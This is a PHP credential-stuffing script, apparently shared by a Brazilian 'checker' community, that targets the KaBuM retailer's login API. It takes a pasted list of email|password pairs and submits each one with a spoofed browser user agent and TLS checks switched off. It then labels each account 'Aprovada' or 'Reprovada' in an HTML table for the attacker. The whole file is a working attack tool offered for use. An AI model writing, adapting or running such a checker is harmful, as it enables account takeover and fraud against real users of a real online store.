<?php

/*
$$\      $$\  $$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  $$\        $$$$$$\  
$$$\    $$$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |      $$  __$$\ 
$$$$\  $$$$ |$$ /  $$ |$$ |  $$ |$$ /  \__|$$ /  $$ |$$ |      $$ /  $$ |
$$\$$\$$ $$ |$$$$$$$$ |$$$$$$$  |$$ |      $$ |  $$ |$$ |      $$$$$$$$ |
$$ \$$$  $$ |$$  __$$ |$$  __$$< $$ |      $$ |  $$ |$$ |      $$  __$$ |
$$ |\$  /$$ |$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |  $$ |$$ |      $$ |  $$ |
$$ | \_/ $$ |$$ |  $$ |$$ |  $$ |\$$$$$$  | $$$$$$  |$$$$$$$$\ $$ |  $$ |
\__|     \__|\__|  \__|\__|  \__| \______/  \______/ \________|\__|  \__|                                                               
SERVIDOR: https://discord.gg/yNdSY97HjY
DISCORD: Marcola#1337                                                                                                           
*/

extract($_GET);
error_reporting(0);
if (file_exists(getcwd().('/cookie.txt'))) { 
    @unlink('cookie.txt'); 
}

function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end, $str[1]);
    return $str[0];
}   

{
    $separador = "|";
    $e = explode("\r\n", $lista);
    $c = count($e);
    for ($i=0; $i <$c; $i++) {
        $explode = explode($separador, $e[$i]);
        Testar(trim($explode[0]),trim($explode[1]));
    }
}
function Testar($email,$senha){
    if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }
    $url = "https://www.kabum.com.br/api/account/login/kabum";
    $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35";
    $postField = '{"login":"'.$email.'","password":"'.$senha.'","session":"$session"}';

    
    //========================================================================================================================//
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(

    //========================================================================================================================//    

        'Accept: application/json, text/plain, */*',
        'Accept-Encoding: gzip, deflate, br',
        'Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Content-Type: application/json',
        'Host: www.kabum.com.br',
        'Origin: https://www.kabum.com.br',
        'Referer: https://www.kabum.com.br/login',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',

                ));
    ;
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postField);
    $resposta = curl_exec($ch);

        if (strpos($resposta, 'cliente_pnome')) {

            echo "<tr><td><span class='badge badge-success'>Aprovada</span></td>";
            echo "<th> $email|$senha";
            echo "<th> Conta logada com Sucesso";
            echo "<th> $time";
            echo "<th> Marcola#1337";
        flush();
        ob_flush();

    }else{
        echo "<tr><td><span class='badge badge-danger'>Reprovada</span></td>";
        echo "<th> $email|$senha";
        echo "<th> Conta não encontrada";
        echo "<th> $time";
        echo "<th> Marcola#1337";
        flush();
        ob_flush();
    }
}
?>
